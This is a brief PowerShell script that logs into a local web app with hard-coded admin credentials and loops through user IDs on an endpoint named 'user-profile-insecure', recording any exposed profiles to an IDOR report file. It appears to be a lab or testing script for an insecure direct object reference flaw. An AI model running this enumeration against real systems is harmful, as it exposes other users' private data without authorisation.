$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-WebRequest -Uri "http://localhost:5000/login" -Method POST -Body @{username="admin";password="admin123"} -WebSession $session

for ($i=1; $i -le 10; $i++) {
    $url = "http://localhost:5000/user-profile-insecure?id=$i"
    $response = Invoke-WebRequest -Uri $url -WebSession $session
    if ($response.Content -like "*Username:*") {
        Write-Output "Found profile for ID $i"
        Add-Content -Path "idor_report.md" -Value "`n## Found: ID $i`n$response.Content`n"
    }
}
